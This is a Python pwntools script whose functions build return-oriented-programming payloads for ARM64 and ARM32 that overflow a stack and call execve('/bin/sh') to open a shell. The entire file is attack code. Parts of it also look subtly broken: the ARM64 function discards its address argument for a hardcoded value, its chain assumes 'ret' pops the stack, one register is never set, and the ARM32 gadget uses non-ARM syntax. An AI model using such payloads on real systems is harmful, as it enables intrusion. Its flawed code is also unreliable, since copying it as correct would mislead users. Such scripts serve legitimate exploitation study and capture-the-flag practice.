from pwn import *  

def construct_payload(offset, gadgets, writable_addr, arch):
    if arch == 'arm64':
        return construct_payload_arm64(offset, gadgets, writable_addr)
    elif arch == 'arm32':
        return construct_payload_arm32(offset, gadgets, writable_addr)
    else:
        log.error(f"Unsupported architecture: {arch}")
        return None

def construct_payload_arm64(offset, gadgets, writable_addr):
    """
    Build the ROP chain for ARM64 to execute execve("/bin/sh", NULL, NULL").
    Required gadgets:
    - "ldp x0, x1, [sp]; ret": Load x0 and x1 from stack.
    - "str x1, [x0]; ret": Store x1 at the address pointed by x0.
    - "mov x8, #0xdd; ret": Set syscall number to execve (221).
    - "svc #0": Trigger the syscall.
    """
    # Padding to reach the return address
    writable_addr = 0x410068
    payload = b"A" * offset

    # Required gadgets
    required_gadgets = [
        "ldp x0, x1, [sp]; ret",
        "str x1, [x0]; ret",
        "mov x8, #0xdd; ret",
        "svc #0"
    ]

    # Ensure all required gadgets are available
    for gadget in required_gadgets:
        if gadget not in gadgets:
            log.error(f"Gadget not found: {gadget}")
            return None

    # Addresses of required gadgets
    addr_ldp_x0_x1 = gadgets["ldp x0, x1, [sp]; ret"]
    addr_str_x1_x0 = gadgets["str x1, [x0]; ret"]
    addr_mov_x8 = gadgets["mov x8, #0xdd; ret"]
    addr_svc = gadgets["svc #0"]

    # Construct the ROP chain
    rop_chain = b""

    # Step 1: Write "/bin/sh" into writable memory
    # Load x0 (writable_addr) and x1 ("/bin/sh\x00")
    rop_chain += p64(addr_ldp_x0_x1)
    rop_chain += p64(writable_addr)     # x0 = writable_addr
    rop_chain += b"/bin/sh\x00"         # x1 = "/bin/sh\x00"

    # Write x1 to memory at address x0
    rop_chain += p64(addr_str_x1_x0)    # str x1, [x0]; ret

    # Step 2: Set up registers for execve
    # Load x0 (writable_addr) and x1 (NULL)
    rop_chain += p64(addr_ldp_x0_x1)
    rop_chain += p64(writable_addr)     # x0 = writable_addr ("/bin/sh")
    rop_chain += p64(0)                 # x1 = NULL

    # Step 3: Set x8 to syscall number 221 (execve)
    rop_chain += p64(addr_mov_x8)       # mov x8, #0xdd; ret

    # Step 4: Trigger the syscall
    rop_chain += p64(addr_svc)          # svc #0

    # Combine the padding and ROP chain
    payload += rop_chain

    # Ensure stack alignment (16-byte alignment)
    if len(payload) % 16 != 0:
        payload += b"A" * (16 - (len(payload) % 16))

    return payload

def construct_payload_arm32(offset, gadgets, writable_addr):
    # Build the ROP chain for ARM32 to execute execve("/bin/sh", NULL, NULL)
    payload = b"A" * offset  # Padding

    rop_chain = b""

    # Required gadgets
    required_gadgets = ["pop {r0, r1, r2, r3, r4, r5, pc}", "svc #0"]

    for gadget in required_gadgets:
        if gadget not in gadgets:
            log.error(f"Gadget not found: {gadget}")
            return None

    # Addresses of gadgets
    addr_pop_r0_to_r5_pc = gadgets["pop {r0, r1, r2, r3, r4, r5, pc}"]
    addr_svc = gadgets["svc #0"]

    # Step 1: Write "/bin/sh\x00" into writable memory
    if "str r1, [r0]; ret" in gadgets:
        addr_str_r1_r0 = gadgets["str r1, [r0]; ret"]
    else:
        log.error("Gadget 'str r1, [r0]; ret' not found.")
        return None

    rop_chain += p32(addr_pop_r0_to_r5_pc)
    rop_chain += p32(writable_addr)  # r0 = writable_addr
    rop_chain += b"/bin"             # r1 = "/bin"
    rop_chain += p32(0) * 5          # r2 to r5
    rop_chain += p32(addr_str_r1_r0) # Write "/bin" to [r0]; ret

    rop_chain += p32(addr_pop_r0_to_r5_pc)
    rop_chain += p32(writable_addr + 4)  # r0 = writable_addr + 4
    rop_chain += b"/sh\x00"              # r1 = "/sh\x00"
    rop_chain += p32(0) * 5              # r2 to r5
    rop_chain += p32(addr_str_r1_r0)     # Write "/sh\x00" to [r0]; ret

    # Step 2: Set up registers for execve
    rop_chain += p32(addr_pop_r0_to_r5_pc)
    rop_chain += p32(writable_addr)  # r0 = writable_addr ("/bin/sh")
    rop_chain += p32(0)              # r1 = NULL
    rop_chain += p32(0)              # r2 = NULL
    rop_chain += p32(0) * 3          # r3 to r5
    rop_chain += p32(addr_svc)       # svc #0

    payload += rop_chain
    return payload
